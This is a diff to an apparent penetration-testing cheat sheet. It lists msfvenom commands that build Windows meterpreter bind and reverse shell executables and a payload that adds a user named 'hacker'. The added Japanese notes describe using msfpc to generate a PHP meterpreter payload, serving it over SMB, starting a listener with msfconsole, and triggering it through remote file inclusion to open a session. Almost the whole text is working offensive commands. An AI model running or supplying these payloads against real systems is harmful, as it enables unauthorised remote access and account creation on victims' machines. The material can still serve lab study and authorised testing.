@@ -15,3 +15,9 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	#Windows CMD Multi Stage
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	#Windows CMD Single Stage
 msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe	#Windows add user
+
+//msfpc（MSFvenom Payload Creator）
+metasploitで動かすペイロードとコマンドセットを自動で作成してくれる。RFIなどで活用できる
+msfpc php <kali IP>　＃これで作成されるphpをsmbディレクトリに置く
+msfconsole -q -r '/home/kali/Desktop/php-meterpreter-staged-reverse-tcp-443-php.rc'　＃runで表示されるこのコマンドを実行するとハンドラーで待ち受けまで自動でする
+RFIなどでphpを読み込ませたらmeterpreterでセッションが確立
